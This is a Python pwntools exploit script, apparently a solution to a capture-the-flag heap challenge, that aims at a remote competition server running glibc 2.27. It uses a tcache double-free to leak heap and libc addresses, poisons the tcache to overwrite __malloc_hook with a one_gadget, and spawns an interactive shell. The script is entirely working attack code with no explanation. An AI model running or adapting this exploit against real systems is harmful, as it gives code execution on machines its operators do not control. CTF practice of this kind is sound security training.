from pwn import  *
from LibcSearcher import LibcSearcher
from sys import argv

def ret2libc(leak, func, path=''):
	if path == '':
		libc = LibcSearcher(func, leak)
		base = leak - libc.dump(func)
		system = base + libc.dump('system')
		binsh = base + libc.dump('str_bin_sh')
	else:
		libc = ELF(path)
		base = leak - libc.sym[func]
		system = base + libc.sym['system']
		binsh = base + libc.search('/bin/sh').next()

	return (system, binsh)

s       = lambda data               :p.send(str(data))
sa      = lambda delim,data         :p.sendafter(str(delim), str(data))
sl      = lambda data               :p.sendline(str(data))
sla     = lambda delim,data         :p.sendlineafter(str(delim), str(data))
r       = lambda num=4096           :p.recv(num)
ru      = lambda delims, drop=True  :p.recvuntil(delims, drop)
itr     = lambda                    :p.interactive()
uu32    = lambda data               :u32(data.ljust(4,'\0'))
uu64    = lambda data               :u64(data.ljust(8,'\0'))
leak    = lambda name,addr          :log.success('{} = {:#x}'.format(name, addr))

context.log_level = 'DEBUG'
binary = './vn_pwn_easyTHeap'
context.binary = binary
elf = ELF(binary,checksec=False)
p = remote('node3.buuoj.cn',28195) if argv[1]=='r' else process(binary,env={'LD_PRELOAD':'./glibc-all-in-one/libs/2.27-3ubuntu1_amd64/libc-2.27.so'})
#libc = ELF('/lib/x86_64-linux-gnu/libc.so.6',checksec=False)
libc = ELF('./glibc-all-in-one/libs/2.27-3ubuntu1_amd64/libc-2.27.so',checksec=False)

def dbg():
	gdb.attach(p)
	pause()

_add,_free,_edit,_show = 1,4,2,3
def add(size,content='a'):
	sla(':',str(_add))
	sla('?',str(size))
	sa(':',content)

def free(index):
	sla(':',str(_free))
	sla('?',str(index))

def edit(index,content):
	sla(':',str(_edit))
	sla('?',str(index))
	sa(':',content)

def show(index):
	sla(':',str(_show))
	sla('?',str(index))

# start
add(0x80) # 0
add(0x80) # 1
free(0)
free(0)
show(0)
heap = uu64(r(6))-0x260
leak('heap',heap)

tps = heap+0x10
add(0x80) # 2 <-> 0
edit(2,p64(tps))

add(0x80) # 3 <-> 1
add(0x80) # 4 <-> tps
edit(4,'\x07'*8+'\x00'*0x70+p64(tps+0x78))
free(0)
show(0)
base = uu64(r(6))-0x60-libc.sym['__malloc_hook']-0x10
leak('base',base)
one = base+0x10a38c
malloc_hook = base+libc.sym['__malloc_hook']

edit(4,'\x07'*8+'\x00'*0x70+p64(malloc_hook-0x8))
add(0x80) # 5
edit(5,flat(one,base+libc.sym['realloc']+4))
sla(':',str(_add))
sla('?',str(0x10))
# end

itr()